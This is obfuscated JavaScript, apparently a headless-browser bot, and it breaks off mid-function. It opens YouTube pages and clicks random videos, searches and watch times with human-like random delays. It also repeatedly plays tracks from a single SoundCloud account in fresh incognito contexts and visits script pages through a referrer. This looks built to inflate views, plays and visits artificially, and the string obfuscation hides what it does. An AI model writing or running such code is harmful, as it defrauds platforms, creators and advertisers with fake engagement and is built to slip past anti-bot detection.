const X = c,
  W = b,
  V = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x52e + -0x1e79 * 0x1 + -0x146 * -0x1c))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1c22 + 0x1ac2 + 0x160), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  const R = b;
  return await f[R(0x16, 'B7A4')](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x71b7 + -0x2ad8 + 0x2e51 + (-0x41f5 + 0xa71 + 0x721c) * random()) : await standardWaitForNetIdle(f), await wait(-0x207e * -0x1 + -0x11 * 0xf7 + 0x371 + (-0x21d * -0x18 + -0x334 + -0x874) * random()), 0x1e62 + 0x1d64 + -0xb * 0x56f;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x152a + 0xb * -0x2e1 + -0xb * -0x2bb), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x2e2 + -0x6cd * -0x5 + -0x24e2;
}
async function randomWait() {
  return await wait(0x24f8 + 0x1913 + -0x2a83 + (-0x232 * -0x3 + 0x21f2 * 0x1 + -0x1500) * random()), -0x1a05 + 0x26a + 0x179c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x174 * 0x1a + 0x257 + 0x2371, -0x1 * -0x1079 + 0x49f * 0x8 + -0x1 * 0x356a), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x15a51 * 0x1 + -0xea6b + 0x32f1c) * getRandomInt(0x637 * -0x1 + -0x221c + 0x2855, -0x1 * -0x2665 + -0x2109 + -0x557), h)), -0x261a + -0x12cd * -0x2 + 0x81 * 0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xd6b + 0x9 * -0x272 + 0x236d * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x43a * -0x5 + -0x26e3 + 0x4e * 0xc5]['split']('\x20');
    for (let k = 0xb * 0x27d + 0x1 * -0x765 + -0x9fd * 0x2; k < i['length']; k += -0x35 * -0x7d + -0xb * -0x32b + -0x10c * 0x3a)
      j += i[k] * h[i[k + (0x1 * -0xe9a + 0x128f * -0x2 + 0x33b9)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * 0x2219 + -0x1 * 0x18df + 0x3afe)['map'](l => Array['from'](l['children']))['flat'](-0xb5d * -0x1 + -0x1 * -0x949 + -0x14a5 * 0x1)['map'](l => l['childNodes'][-0x1af2 + -0x1a60 + 0x3553 * 0x1]['childNodes'][0x1d56 + 0x1be * 0x10 + -0x3 * 0x1312]['childNodes'][-0x6ea + -0x1272 + -0x195d * -0x1]['childNodes'][0x11 * -0x127 + 0x32 * -0x37 + 0x1e55]['childNodes'][0xabb + -0x1d * 0x9d + 0xd * 0x8b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x281 * 0x4 + 0x559 * -0x2 + -0x496 * -0x1, -0xe * -0x257 + 0x3ba * -0x9 + 0x1450)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x8e * -0x1f + 0x2bf1 + -0x1f * -0x107);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1bd9 * -0x8 + -0x26e0 + -0x88 * -0x5f) * getRandomInt(0x17 * 0x16 + -0x3 * -0x7fb + -0x43 * 0x63, -0x1517 + 0xb2e + 0x9ee), h);
  return await wait(i), -0xe81 + 0xdd1 + -0x1 * -0xb1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1f73 + 0x231c + -0x1 * 0x3a9]['children'][0xee6 + 0x1333 + 0x1 * -0x2219]['children'][-0x1dec + -0x1 * 0x2099 + -0x42b * -0xf]['children'][-0xd * 0xa1 + -0x1f25 + 0x13a9 * 0x2]['children'][0x1 * -0xefc + -0xee1 * 0x1 + 0x1ddd]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x295 * 0x3 + -0x11b2 + 0x1972;
}
async function searchAndView(f) {
  const T = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = b;
    let j = Array['from'](document['querySelec' + 'torAll'](S(0xc, 'w0w6')));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x25f * 0xd + 0x25cf * 0x1 + -0x443e + (-0x2 * 0x6a3 + -0x1ef8 + 0x3 * 0xed0) * random()
  }), await wait(-0xad * 0x13 + 0x9ab + 0x520 + (-0x1cf * 0x7 + -0xf9f + 0x1d74) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x3b * 0x81 + 0x5 * 0x6b9 + -0x3e0]['childNodes'][-0x1 * 0x1690 + -0x3 * 0x625 + 0x10 * 0x290]['childNodes'][0x328 + 0x1e84 + -0x21ab * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x151 * 0x1 + -0x37a * 0x8 + 0x1a84]['childNodes'][0x1b84 + -0xf2b + -0xc59]['childNodes'][0x1f97 + 0x4 * 0x36d + -0x2d49]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x183e * 0x1 + 0x1134 + -0x259 * -0x3),
          r = -0x9e5 + -0x1 * 0x1bd2 + 0x78b * 0x5;
        for (let u = -0x2 * -0x8f9 + 0x2436 + -0x4 * 0xd8a; u < q['length']; u += -0x1cdb + -0x1 * 0x833 + 0x2510)
          r += q[u] * k[q[u + (-0x4c * 0x69 + 0x23 * -0xf2 + -0x4043 * -0x1)]];
        return r;
      }(n);
  });
  await wait((-0x10bb * -0x1 + 0x9b8 * -0x1 + 0x3395) * Math['random']()), await f['click']('#__hookedV' + T(0xf));
  let i = Math['min']((0x3cf2 * -0x3 + 0x1921e + 0xf18) * getRandomInt(-0x27 * 0xb3 + 0x25e2 + -0x61 * 0x1c, -0x40d * 0x1 + 0x1f * -0xc3 + -0xc * -0x24f), h + (-0x9df + 0x22a9 + 0x2 * -0x2a1));
  return await wait(i), -0x7e9 + -0x1022 + -0x1b * -0xe4;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1c85 + -0x1 * -0x10f5 + -0x2d7a), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x26cb * -0x1 + 0x2270 + 0x1013 + (0x15d * -0x6 + 0x1833 + -0xc1d) * Math['random']());
    });
  }, 0x8b * 0x43 + 0x1638 + -0x1f41);
  await wait(-0x3ab1e + -0x59 * 0x12ec + 0xed30a);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * 0x18012 + -0x173bd * 0x1 + 0xde0b) * getRandomInt(-0x23e3 + 0x433 * -0x5 + 0x1 * 0x38e6, 0x789 * 0x1 + 0x1699 + -0x1e09)), clearInterval(h), 0x1 * 0x201b + 0x1a66 + -0x3a80;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xd15 + 0x1 * 0x180e + -0x2523;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x4f1 + -0x348 + -0x1 * 0x1a8;
    await randomWait();
  }
  return 0xb80 + 0xc3f + -0x17be;
}

function a() {
  const bm = [
    'w.youtube.',
    'zw51C2vYANmUBW',
    'rg/en/scri',
    'W6BcUcNdVhNcPsxcRSkGW6y',
    'W6ZcKCodW5pdNvnKfq',
    'W4qfzYa',
    'AMjNCxz4Dgf1BW',
    'W5qAnSo3je/dSmkylSkq',
    'u3Hot2nAmxm4nq',
    'ChrZl2j5lxnPDa',
    'C2vLlxbLB3bSzq',
    'rg/scripts',
    'dg5AW7HvWPzN',
    'youtube-po',
    'Bg9JA2LUzY1HnG',
    'AwruB0nSAwnR',
    'ELCkWRFcMaK9rCoaWOK',
    'vvLYBxfmm2npra',
    'weLYohfVDeHpsq',
    'ideoDownlo',
    'WOFcIxL1laXnWR/cV8ol',
    'WP/cNxmAfJXcWQtcRSoQ',
    'CCo5vCkh',
    'com?page=9',
    'sSkirHz/W5ZcH2RcPca',
    'CxDKD3fKD3fKDW',
    'o\x20instakil'
  ];
  a = function() {
    return bm;
  };
  return a();
}

function fetchRandomSC() {
  return Math['random']() <= 0x709 + -0xe84 * -0x1 + -0x158d + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x2409 + -0x1 * 0x16ca + -0xd3f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * 0x2485 + -0x26f * 0x6 + 0x331f);
    let h = e[f];
    if (c['ZaiLWk'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1294 + 0x14c0 + -0x2 * 0x116, r, s, t = 0x16dd + 0x46 * 0x6 + -0x1881; s = m['charAt'](t++); ~s && (r = q % (-0x1e79 * 0x1 + -0x259d * 0x1 + 0x441a) ? r * (0x1ac2 + -0x1e90 + -0x2 * -0x207) + s : s, q++ % (-0x11d6 + -0x160e + -0x27e8 * -0x1)) ? o += String['fromCharCode'](-0xb * 0x23 + -0xb88 * 0x1 + -0x4 * -0x382 & r >> (-(-0x522 + -0x21d * -0xc + -0x1438) * q & -0x3df * 0x5 + 0x1e62 + -0x3 * 0x3ab)) : 0x152a + 0xb * -0x2e1 + -0x1 * -0xa81) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2e2 + -0x6cd * -0x5 + -0x24e3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x24f8 + 0x1913 + -0x3dfb))['slice'](-(-0x232 * -0x3 + 0x21f2 * 0x1 + -0x2886));
        }
        return decodeURIComponent(p);
      };
      c['hDtRyv'] = i, b = arguments, c['ZaiLWk'] = !![];
    }
    const j = e[-0x1a05 + 0x26a + 0x179b],
      k = f + j,
      l = b[k];
    return !l ? (h = c['hDtRyv'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1 * -0x1897 + 0x19d9 + -0x2 * 0xa1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x170d * -0x1 + -0x1 * 0x4a3 + 0x1bb0;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k[U(0x4, 'GJpc')](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x10303 + 0xf945 + -0x14c80 + getRandomInt(0xb61 + -0x6b31 * -0x1 + 0x6aa * -0x9, 0x5224 + 0x2dbf * -0x2 + 0x7e8a));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x4 * -0x6cd + 0x5 * 0x28 + -0x1bfb), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x219a + 0x88a + 0x1910;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x219 * -0x2 + 0x1ad1 * -0x1 + 0x169f, 0x1cb1 + -0x17 * -0x11 + -0x1e06)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * -0x1337 + 0x8f + 0x2 * -0x5fb + floor((-0x21cb * -0x1 + 0x38 * 0x98 + -0x7 * 0x905) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3ddc476 + 0xfa4de7a + 0x5f2 * 0x138c6e),
          0x89c7c4 + 0x54828b * -0x3 + 0xf3bfdd,
          -0xb6 * -0xbc + -0x5e13 * -0x1 + -0xd3 * 0x79,
          -0x1274 + -0x31d * -0x1 + 0xfd7
        ], y = [
          0x36f + -0x7 * -0x257 + -0x13b8,
          -0x18 * -0xaa + 0x1e30 + -0x2e10,
          -0xd43 * -0x1 + 0x727 * -0x1 + -0x30a * 0x2,
          -0x2 * -0xb04 + -0x521 * -0x3 + 0x135 * -0x1f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1ce5 + 0x2442 + -0x3e * 0x10d)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1 * -0x259b + 0x2589 + -0x4b24; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x101f + 0x20 * 0x13 + -0x5 * 0x3b3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x5 * 0x2bd + -0xcaa + -0x27 * -0xad] = A[-0x8b0 + 0x9 * 0x283 + -0xddb * 0x1] = A[-0xfe + -0x19b9 + -0x23a * -0xc] = A[-0x2 * -0x78d + -0x46 * -0x7d + -0x3146] = A[-0x344 + 0x1 * -0x33b + 0x682] = A[0x18 * 0x1a + 0x1 * -0xf43 + -0xad * -0x13] = A[-0x6c0 + -0x319 + 0x34a * 0x3] = A[0x36f + -0x1741 * -0x1 + -0x1 * 0x1aaa] = A[-0x59 * 0x12 + -0xe9d + -0x42e * -0x5] = A[0xd86 + 0x6 * -0x2e + -0xc6a] = A[0x1a34 + -0x237e + -0x953 * -0x1] = A[-0xc5c * 0x1 + -0xc1d + 0x4e7 * 0x5] = A[-0xbcc + 0x1463 + -0x1 * 0x88c] = A[0x354 + -0x1101 * -0x1 + -0x1449] = A[0x12df + 0x8d * 0x9 + 0x7ed * -0x3] = A[0xf7c + 0x3b3 * 0xa + 0xa7c * -0x5] = A[0x22bd * -0x1 + -0x14b + 0x1 * 0x2417] = -0x12c9 + 0x653 * 0x3 + -0x30, this['blocks'] = A) : this['blocks'] = [
                -0x15b4 + 0x68d + 0xf27,
                0x7 * -0x219 + -0x13b + 0xfea,
                -0x1a88 + -0x1145 + 0x1 * 0x2bcd,
                0x471 + -0x14a1 + 0x1030,
                -0x1f8d + 0xaf * -0x3 + 0x17 * 0x176,
                -0xa * 0x241 + 0x263b + -0xfb1,
                0x1 * 0xbe3 + 0x2b * -0x33 + -0x1 * 0x352,
                -0x1 * -0x2539 + 0xe56 + -0x338f,
                0x1740 * -0x1 + -0x12d + 0x186d * 0x1,
                0x9de + 0x223d + 0x1 * -0x2c1b,
                -0x10c + 0x12 * 0x8e + 0x68 * -0x16,
                0x12 * -0x107 + 0x27 * -0x75 + 0x2451,
                -0x1 * -0x4d5 + -0x1523 + 0x104e,
                0xcea + 0x567 * 0x3 + -0x15 * 0x163,
                0xb * -0xd + 0x43 * -0x7 + 0x264,
                0x2028 + -0x1 * -0x599 + -0x1 * 0x25c1,
                0x1430 + 0x2261 + 0xe5 * -0x3d
              ], this['h0'] = 0x40544c90 + 0x1c9 * 0x1c69df + -0xbc828a6, this['h1'] = 0x5b10ce69 + -0x9c47a66e + 0x13104838e, this['h2'] = -0xa7e91eab + -0xb400732 + 0x5 * 0x4260cd5f, this['h3'] = 0x20491 * -0xbe6 + -0x725ad29 + 0x2f5a56e5, this['h4'] = -0x803732b4 + -0xc501b30c + 0x2090bc7b0, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1636 + -0xe00 + 0x2436, this['finalized'] = this['hashed'] = -0x9f7 + -0x239c + 0x2d93, this['first'] = 0xd1f * -0x1 + -0x1bd3 + 0x1 * 0x28f3;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * -0x10f + 0x313 * 0x2 + -0x735, O = J['length'] || -0x6f + -0xf2e * 0x1 + 0x23b * 0x7, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x25d0 + 0x1e60 + -0x4430, P[-0x9b * 0x2 + 0x1635 + 0x19 * -0xd7] = this['block'], P[0x17f8 * -0x1 + 0x1d19 + -0x1 * 0x511] = P[-0xaf + 0x35 * -0x7a + 0x19f2] = P[0x127b + 0x1bdb + -0x2e54] = P[0x2541 + -0x475 * 0x7 + -0x11 * 0x5b] = P[-0x1 * 0xc56 + 0x25a6 + 0x4 * -0x653] = P[0x1c7f + -0x7f * -0x4 + -0x1e76] = P[-0x26 * 0x5f + 0x20d6 + -0x12b6] = P[0x1 * -0x1f50 + -0x1ac2 + 0x3a19] = P[0x2 * 0x10a5 + -0x198e + -0x74 * 0x11] = P[-0x59f * -0x4 + 0x3e * -0x5 + 0x153d * -0x1] = P[-0xc8c + 0x1f71 + -0x12db] = P[-0x2550 + 0x186f + -0x1 * -0xcec] = P[-0x303 * -0x4 + 0xf2b + -0x1b2b] = P[0x7b * 0x1f + -0x1ba7 + 0xccf * 0x1] = P[-0xc7 + -0x8f * 0xd + -0x8 * -0x103] = P[-0x11 * -0x4b + 0xaeb + -0x1 * 0xfd7] = 0x58d + -0x55e + -0x1 * 0x2f), K) {
                    for (N = this['start']; M < O && N < -0x22be + 0xf32 + -0xe * -0x16a; ++M)
                      P[N >> -0x1 * 0x5a5 + -0x2669 + 0x2c10] |= J[M] << y[-0x1 * 0x117b + -0xc1c + 0x1d9a & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x2 * -0x9d7 + -0x1745 * -0x1 + -0x2ab3 * 0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x5 * -0x19c + 0x152 * -0x7 + -0xfd * -0x12 ? P[N >> -0x209 + 0x23f6 + -0x21eb] |= L << y[0x291 * -0xc + 0x1bf2 + 0x1 * 0x2dd & N++] : L < -0x431 * 0x3 + 0x19eb + -0x558 ? (P[N >> -0x1f0c + 0x161 * 0xa + 0x1144] |= (0xc * -0x17b + 0x1374 + 0x2 * -0x78 | L >> -0xf5b * -0x2 + -0x1517 * -0x1 + -0x33c7) << y[-0x1d0c + 0x1a78 + -0x3 * -0xdd & N++], P[N >> 0x486 + 0x547 * 0x7 + 0x2975 * -0x1] |= (0x21ac + -0x15f7 * 0x1 + -0xb35 | 0x2d7 * 0x9 + -0x1469 + -0x4e7 & L) << y[0x87b + -0x7dc * -0x4 + -0x9fa * 0x4 & N++]) : L < -0x4b49 + -0x134ed * 0x1 + 0x25836 * 0x1 || L >= -0x7 * -0x1199 + -0x10 * -0xce9 + -0x69bf ? (P[N >> 0x3a * -0x61 + -0xe22 + -0x6 * -0x605] |= (-0x15ff * 0x1 + -0x2123 + -0x2 * -0x1c01 | L >> -0x500 + -0x1 * 0xbdd + -0x1 * -0x10e9) << y[0x2140 + 0x2137 + -0x4 * 0x109d & N++], P[N >> 0x1002 + -0x1b06 + -0xb06 * -0x1] |= (-0x57f + 0x1823 + 0xac * -0x1b | L >> 0x2671 + 0x1a * 0x124 + -0x4413 & 0x949 * -0x1 + -0x3e3 * -0x8 + -0x1590) << y[0x1cb1 + -0x1a1 * -0xd + 0x31db * -0x1 & N++], P[N >> 0x2 * 0x39 + 0x7 * -0x489 + -0x479 * -0x7] |= (0x89 * 0xb + 0x34d * 0x1 + -0x8b0 | -0x203f + 0x25ce + -0x550 & L) << y[-0x5 * 0x727 + 0x1a47 * -0x1 + 0x3e0d & N++]) : (L = 0xa973 * -0x2 + -0xb739 + 0x30a1f + ((-0x304 + -0x1d44 + -0x2447 * -0x1 & L) << 0x245f + -0x1 * 0x3ce + -0x1 * 0x2087 | 0x2 * -0xe36 + 0x23a6 + -0x1 * 0x33b & J['charCodeAt'](++M)), P[N >> 0x1861 + 0x6a * 0x46 + -0x355b] |= (0x2289 + 0x62 * -0x31 + 0x1d * -0x83 | L >> 0x1635 + 0x2 * -0x176 + -0x1337) << y[-0x90 + 0xbbb + 0x1 * -0xb28 & N++], P[N >> 0x1123 * 0x1 + -0x102 + -0x101f] |= (-0xb4 + 0x220 * 0xa + -0xa06 * 0x2 | L >> -0x44a + 0xf1e + -0xac8 & 0x166b + -0x27 * 0x95 + -0x87 * -0x1) << y[-0x9a4 + 0x1 * 0x8a5 + -0x6 * -0x2b & N++], P[N >> -0x2285 * 0x1 + 0x148 + 0x213f] |= (-0x1529 + -0x82d + 0x26 * 0xc9 | L >> -0x17d8 + 0x992 * -0x2 + 0x2b02 & -0x1 * -0x1021 + 0x3 * 0x126 + -0x1354) << y[0xf7d + -0x56 + -0xe4 * 0x11 & N++], P[N >> 0xd * -0x46 + 0xe4d * 0x1 + -0xabd] |= (0x1274 + 0x3 * 0x822 + -0x2a5a | 0x59a * 0x4 + 0x14f4 + -0xd * 0x351 & L) << y[-0x38b * 0x2 + 0x13cc + 0xcb3 * -0x1 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x25 * 0x8b + -0x1e13 * 0x1 + 0xa3c ? (this['block'] = P[0x1 * 0x6e1 + 0x1 * 0x34b + 0x4 * -0x287], this['start'] = N - (0x27 * -0x2f + -0x18fe + 0x2067 * 0x1), this['hash'](), this['hashed'] = -0x1327 + 0x520 + -0x8 * -0x1c1) : this['start'] = N;
                }
                return this['bytes'] > -0x13a5079b3 + -0x1 * 0x1323c18b7 + 0x36c8c9269 && (this['hBytes'] += this['bytes'] / (0x93e9 * -0x3310c + -0x18bff1040 + 0x2 * 0x232084c16) << -0x5 * 0x5f7 + -0xf7f * 0x1 + -0x1 * -0x2d52, this['bytes'] = this['bytes'] % (0x8c55ad80 + -0x85bb56d8 + -0x8 * -0x1f2cb52b)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x24e7 + -0x674 + 0x2b5c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
